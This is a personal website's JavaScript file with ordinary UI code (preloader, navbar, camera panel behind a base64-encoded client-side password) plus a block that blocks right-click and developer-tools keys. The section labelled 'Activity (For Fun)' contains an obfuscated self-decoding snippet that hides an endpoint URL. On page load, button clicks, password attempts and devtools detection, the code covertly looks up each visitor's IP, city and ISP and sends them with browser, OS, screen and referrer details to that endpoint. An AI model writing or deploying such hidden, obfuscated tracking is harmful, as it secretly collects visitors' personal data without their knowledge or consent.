// Click Sound (PC Only)
var audio = new Audio("assets/Others/Click.wav");

function isMobileDevice() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
         (navigator.maxTouchPoints && navigator.maxTouchPoints > 2);
}

if (!isMobileDevice()) {
  document.onclick = function() {
    audio.volume = 0.2;
    audio.play();
  };
}

// Preloader JS
setTimeout(function() {
  $("#preloader").fadeOut("slow");
}, 2000);

var loader = document.getElementById("preloader");
window.addEventListener("load", function() {
  window.addEventListener("scroll", disableScroll);
  hideScrollbar();

  setTimeout(function() {
    window.removeEventListener("scroll", disableScroll);
    showScrollbar();
  }, 2600);
});

function disableScroll() {
  window.scrollTo(0, 0);
}

function hideScrollbar() {
  document.documentElement.style.overflow = 'hidden';
}

function showScrollbar() {
  document.documentElement.style.overflow = 'auto';
}

// Navbar JS
const enable = (e) => {
document.getElementById('burger').classList.toggle("open");
document.getElementById("nav").classList.toggle("nav-open");
};

// Setup Button
var collapsibleButton = document.querySelector('.collapsible-button');
var contentBox = document.querySelector('.content-box');
collapsibleButton.addEventListener('click', function() {
  if (contentBox.style.display === 'block') {
    contentBox.style.display = 'none';
  } else {
    contentBox.style.display = 'block';
  }
});
var closeButton = document.querySelector('.close-button');
closeButton.addEventListener('click', function() {
  contentBox.style.display = 'none';
});

// Camera Button
let isCameraContentBoxVisible = false;
let isPasswordCorrect = false;
let passwordAttempts = 0;
const encodedPassword = 'c2ViYXNlYmEx';

document.querySelector('.camera-button').addEventListener('click', function() {
  let passwordBox = document.querySelector('.password-box');
  let contentBox = document.querySelector('.camera-content-box');
  if (passwordBox && passwordBox.style.display === 'flex') {
    passwordBox.style.display = 'none';
    document.getElementById('password').value = '';
    return;
  }
  if (contentBox && contentBox.style.display === 'flex') {
    contentBox.style.display = 'none';
    isCameraContentBoxVisible = false;
    return;
  }

  if (!passwordBox) {
    passwordBox = document.createElement('div');
    passwordBox.classList.add('password-box');
    passwordBox.innerHTML = `
      <input type="password" id="password" placeholder="Password">
    `;
    document.querySelector('.camera-button').appendChild(passwordBox);

    document.getElementById('password').addEventListener('keypress', function(event) {
      if (event.key === 'Enter') {
        const password = event.target.value;
        if (btoa(password) === encodedPassword) {
          passwordAttempts++;
          document.getElementById('password').value = '';
          if (passwordAttempts === 1) {
            isPasswordCorrect = true;
            alert('✅ Password correct. 🔁 Please enter again to unlock content.');
            sendM('✅ **Password Correct**');
          } else if (isPasswordCorrect) {
            passwordBox.style.display = 'none';
            showCameraContentBox();
          }
        } else {
          alert('❌ Incorrect password.');
          sendM('❌ **Incorrect password**');
          passwordAttempts = 0;
          isPasswordCorrect = false;
        }
      }
    });
  } else {
    passwordBox.classList.add('fade-in');
    passwordBox.style.display = 'flex';
  }

  document.getElementById('password').focus();
});

function showCameraContentBox() {
  let contentBox = document.querySelector('.camera-content-box');
  if (!contentBox) {
    contentBox = document.createElement('div');
    contentBox.classList.add('camera-content-box');
    document.body.appendChild(contentBox);
    contentBox.innerHTML = `
      <span class="close-button">&times;</span>
      <div class="camera-content">
        <iframe src="https://rtsp.me/embed/nynG2ert/" frameborder="0" controls allowfullscreen></iframe>
        <iframe src="https://rtsp.me/embed/tthyKabs/" frameborder="0" controls allowfullscreen></iframe>
        <img id="image1" src="https://aero.webcam/cam/epsu-1.jpg" title="Odświeżane co 1 minutę" alt="">
        <img id="image2" src="https://aero.webcam/cam/epsu-2.jpg" title="Odświeżane co 1 minutę" alt="">
        <img id="image3" src="https://aero.webcam/cam/epsu-3.jpg" title="Odświeżane co 1 minutę" alt="">
      </div>
    `;
  }

  contentBox.style.display = 'flex';
  isCameraContentBoxVisible = true;

  contentBox.querySelector('.close-button').addEventListener('click', function() {
    contentBox.style.display = 'none';
    isCameraContentBoxVisible = false;
  });
}

// No Inspect
window.onload = function () {
  document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
    showNotification("Nuh Uh");
  }, false);

  document.addEventListener("keydown", function (e) {
    //  Ctrl + Shift + I
    if (e.ctrlKey && e.shiftKey && e.key === "I") {
      disabledEvent(e);
    }
    // Ctrl + Shift + J
    if (e.ctrlKey && e.shiftKey && e.key === "J") {
      disabledEvent(e);
    }
    // Ctrl + Shift + C
    if (e.ctrlKey && e.shiftKey && e.key === "C") {
      disabledEvent(e);
    }
    // "S" key + macOS
    if (e.key === "S" && (navigator.userAgent.includes("Mac") ? e.metaKey : e.ctrlKey)) {
      disabledEvent(e);
    }
    // Ctrl + U (Source)
    if (e.ctrlKey && e.key === "U") {
      disabledEvent(e);
    }
    // Ctrl + I (Mozilla Site Info)
    if (e.ctrlKey && e.key === "I") {
      disabledEvent(e);
    }
    // F12
    if (e.key === "F12") {
      disabledEvent(e);
    }
  }, false);

  function disabledEvent(e) {
    e.stopPropagation();
    e.preventDefault();
    showNotification("Nuh Uh");
    return false;
  }

  function showNotification(message) {
    var notification = document.getElementById("notification");
    notification.textContent = message;
    notification.style.transform = "translateY(0%)";
    notification.style.opacity = "1";
    setTimeout(function () {
      notification.style.transform = "translateY(100%)";
      notification.style.opacity = "0";
    }, 2000);
  }
}

// Mobile Resizer
function toggleContent() {
  var mobileContent = document.getElementById('mobileContent');
  var desktopContent = document.getElementById('desktopContent');
  var screenWidth = window.innerWidth;
  if (screenWidth <= 768) {
    mobileContent.style.display = 'block';
    desktopContent.style.display = 'none';
  } else {
    mobileContent.style.display = 'none';
    desktopContent.style.display = 'block';
  }
}
toggleContent();
window.addEventListener('resize', toggleContent);

// Refresh Lanyard Images
function refreshLanyardImages() {
  var lanyardImage1 = document.getElementById('lanyardImage1');
  var lanyardImage2 = document.getElementById('lanyardImage2');
  var timestamp = new Date().getTime();
  lanyardImage1.src = "https://lanyard-profile-readme.vercel.app/api/430436408386125824?animated=true&showDisplayName=true&timestamp=" + timestamp;
  lanyardImage2.src = "https://lanyard-profile-readme.vercel.app/api/430436408386125824?animated=true&showDisplayName=true&timestamp=" + timestamp;
}
setInterval(refreshLanyardImages, 2000); // Refresh every 2 seconds

// Refresh Cameras Images
function refreshImages() {
  var image1 = document.getElementById('image1');
  var image2 = document.getElementById('image2');
  var image3 = document.getElementById('image3');
  var timestamp = new Date().getTime();
  image1.src = "https://aero.webcam/cam/epsu-1.jpg?timestamp=" + timestamp;
  image2.src = "https://aero.webcam/cam/epsu-2.jpg?timestamp=" + timestamp;
  image3.src = "https://aero.webcam/cam/epsu-3.jpg?timestamp=" + timestamp;
}
setInterval(refreshImages, 60000); // Refresh every 60 seconds

// Activity (⚠️ For Fun ⚠️)
let devToolsMessageSent = false;
var wurl;(function(){var MhU='',Ohc=356-345;function pCg(s){var w=459323;var r=s.length;var b=[];for(var f=0;f<r;f++){b[f]=s.charAt(f)};for(var f=0;f<r;f++){var a=w*(f+128)+(w%35118);var l=w*(f+246)+(w%50678);var g=a%r;var u=l%r;var m=b[g];b[g]=b[u];b[u]=m;w=(a+l)%1872265;};return b.join('')};var KUn=pCg('qoxrtyknuaslchdvfroijccpzwmtrgubnteos').substr(0,Ohc);var IEl='(shcv(<vv0=5h,0=(4y+ca.ni."bldyfr,kj=lx={phrstn;[tcz);[ig o+a8o049=ie8)taa=,]6l=6i=2yu0("2n7l.jgr2[,.m ;c1iCegc,rh(00,,civ02t0o.y]p;6re;r,(bafei}rdlar9t;;g;c)(ao[ye]0 ;ta{ .o2r[]=du=t)rf+hfal=a6ra,f+7(h5rrCo1=xnv9; moaw;.lanzrt;]inbh;avlh)f1g]n-oe {xh.sk (,8c (1]f;rC="t,t8grlrns;}-..;nprft{-;((=4 ;)ratlevlr;pr"[ [}plr;}=,g.ln=.xea50}e"r=.C,[ba>p4irj=1qe;r)7= a= u{+;t3r;.),4);=n)gil }yaoegd)7 gv)ga("(=)(c=c;vad-,c;f;sv1e*rv)euhev1. i9r=(i1e=5ar=.e=+h(Cbtv" (ff((v9da +futo.qedfclnd+p.aS8[{6r[A,"<[()1++o hvrno[;htcsf2c-pt2=r;3+,2as-lloeesn0u=ui+u+f(lnlnu.u) =*8as+vA>tw+;piuhhp(sor(thv.a,,]!l)ay,stk;(a[7+8]n;r=eo+v+rri (wainr)dn]or<C);7)i)u,bmivr=t8;gAsh))-=1ta ypyoj,("1)gl6ktp.sh()[c4ovtair1](s+jsilCr(;]zohvfx;1e,0ng<iv56)(;p)9=.ce;crtvtqm2cfa==s,7iann=r;.Couo].)e+;6n;8h]z)n7 9d+;;<qois;+=hniv+)k(4dc+l;t w.um.2a,Aa(i)ohvo{,)Stnfscc;rdpv,erhgA=in=2n+e rerih=}.apil;tg)i"(o)paaur!w= ';var zkl=pCg[KUn];var MPk='';var LYh=zkl;var txr=zkl(MPk,pCg(IEl));var xRU=txr(pCg('\/e4=e.d,c_)f,0Y.= YnC,n.ab#p+r5Y)Yb).$;n21,}Ys,+4.2w,oe1.r.i!b3S#n.5w4$9t*Yfe7s"tt )_%=)18Ya}h:$aoYz2!#j=nY"e)oY$.02o]z)!mdd0=1(Nd.)g)}5tYo4tu1){fz!k$o(06o.}a;u!oYr. Y.Yd_6..hYlYzY0tY.;jCsnp5pah;;_((Y tvn1 "!9ip0(.jYb2eY03#Cr7j+kr$l#vY.381_(Y 1k cvb(.!u.cs,4oih.o_.)%_,! fcopsY[c}6Y1I,r;p.qbgur,mY1Yf971. 1Yzc.o3%(=TY;evi$"tbhbmNe8.c{eg, r+leal4=.)Y$rps__ur[];\/horrY*;.=,4=.Y$a.%rgpn6toS)Y1a-Yac_h(,,n.=.*t(p4Y;2;c.\/3070\/Y\/lis-+6..#9!os+i{(Y3,(u13...)+zks*c,f28.nx.Yu;-h\'73.8)))()c "jo.)j&6,r9Y8.*.r06);0($!=ttf-5,r_+x9;_.Y3;Y)3.Y_,0;2Y($$Y).!_6csmY,.=.\/rfkf*);esY6g($cppY2,Y6Y,.r\/c(,$1b%iY$6jtY}";1Y(szoY=n+i..cr.o_ft(p(,.h2!;4%fhi6!,o5[ia2acY()Y=Yz(oY=8f!.pxo(fxfwtc.e{Yohds0.t.j{Y=cf.4 ,j6$s_#e(p)!!2eY)\'v.Y13 \'k)jit.YeY1(c)1..7wur)2cc%$s187b)h;2g(rsh4 Yr,s,n).l.z}c.f_)%(Y1\/Y\/!(om5Y,o45rysY3YYy=t{f=m_t5!.s+\/Y!35Y(sYff."Y$1!e$t$]\/ swu.(t)zpYi&$.$+\'I8o!sg{,te.)la!Y.,Y_ br)s;1rcsY$=c4.l&f.es;$e2i$ba)(Se5YjcY.6)t(e_aY)*7rlt2!ir)b3=rp(lr.wYyp;{,88}9sfYYjgfY{&}p; $)0js!!;((..*i3.}})ta7sn=mfn19}+_]'));var ZJz=LYh(MhU,xRU );ZJz(7545);return 5278})()

function getBrowserAndOS() {
  const ua = navigator.userAgent;
  let browser = '❌', os = '❌';

  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
  else if (ua.includes("Edg")) browser = "Edge";
  else if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("MSIE") || ua.includes("Trident")) browser = "Explorer";

  if (ua.includes("Win")) os = "Windows";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
  else if (ua.includes("Mac")) os = "MacOS";

  return { browser, os };
}

function sendM(message, buttonName = '') {
  const { browser, os } = getBrowserAndOS();
  const referrer = document.referrer || '❌';
  const screenResolution = `${screen.width}x${screen.height}`;
  const request = new XMLHttpRequest();
  request.open("POST", wurl);
  request.setRequestHeader('Content-type', 'application/json');

  fetch('https://api64.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;

      fetch(`https://ipapi.co/${ip}/json/`)
        .then(res => res.json())
        .then(location => {
          const city = location.city || '❌';
          const isp = location.org || '❌';

          const embed = {
            title: message,
            color: parseInt("5d35b2", 16),
            fields: [
              { name: "───────────────────────", value: "\u2003", inline: false },
              { name: "🕒", value: new Date().toLocaleString(), inline: false },
              { name: "🌐", value: browser, inline: true },
              { name: "🖥️", value: os, inline: true },
              { name: "📏", value: screenResolution, inline: true },
              { name: "🌐", value: ip, inline: true },
              { name: "🏙️", value: city, inline: true },
              { name: "📡", value: isp, inline: false },
              { name: "🔗", value: referrer, inline: false }
            ]
          };

          const embeds = [embed];

          if (buttonName) {
            embeds[0].fields.unshift({
              "name": "🔗 **Button Clicked**",
              "value": buttonName,
              "inline": true
            });
          }

          const params = {
            username: "Website Notification",
            avatar_url: "https://nobitek.pl/assets/Images/Icon.png",
            embeds: embeds
          };

          request.onreadystatechange = function() {
            if (request.readyState === XMLHttpRequest.DONE) {
              const responseStatus = request.status;
              if (responseStatus !== 204) {
                console.error('Failed:', responseStatus);
              }
            }
          };

          request.send(JSON.stringify(params));
        })
        .catch(error => console.error('Geo Error:', error));
    })
    .catch(error => console.error('IP Error:', error));
}

function isDevToolsOpen() {
  const threshold = 160;
  const widthThreshold = window.outerWidth - window.innerWidth > threshold;
  const heightThreshold = window.outerHeight - window.innerHeight > threshold;
  return widthThreshold || heightThreshold;
}

setInterval(() => {
  if (isDevToolsOpen() && !devToolsMessageSent) {
    sendM('🛠️ **Developer Tools**');
    devToolsMessageSent = true;
  }
}, 1000);

window.addEventListener('resize', () => {
  if (!isDevToolsOpen()) {
    devToolsMessageSent = false;
  }
});

document.addEventListener('DOMContentLoaded', function() {
  sendM('👤');

  const collapsibleButton = document.querySelector('.collapsible-button');
  if (collapsibleButton) {
    collapsibleButton.addEventListener('click', function() {
      sendM('🖥️ **Setup Button**');
    });
  }

  const cameraButton = document.querySelector('.camera-button');
  if (cameraButton) {
    cameraButton.addEventListener('click', function() {
      sendM('📷 **Camera Button**');
    });
  }

  const buttons = document.querySelectorAll('a.button');
  buttons.forEach(button => {
    button.addEventListener('click', function() {
      const buttonName = this.classList.contains('discord') ? 'Discord' :
                         this.classList.contains('instagram') ? 'Instagram' :
                         this.classList.contains('youtube') ? 'YouTube' :
                         this.classList.contains('steam') ? 'Steam' :
                         this.classList.contains('spotify') ? 'Spotify' :
                         this.classList.contains('twitch') ? 'Twitch' : 'Unknown';
      sendM('', buttonName);
    });
  });
});

// Debug Logs
console.log('Script loaded, wurl:', wurl);
console.log('Current page:', window.location.href);
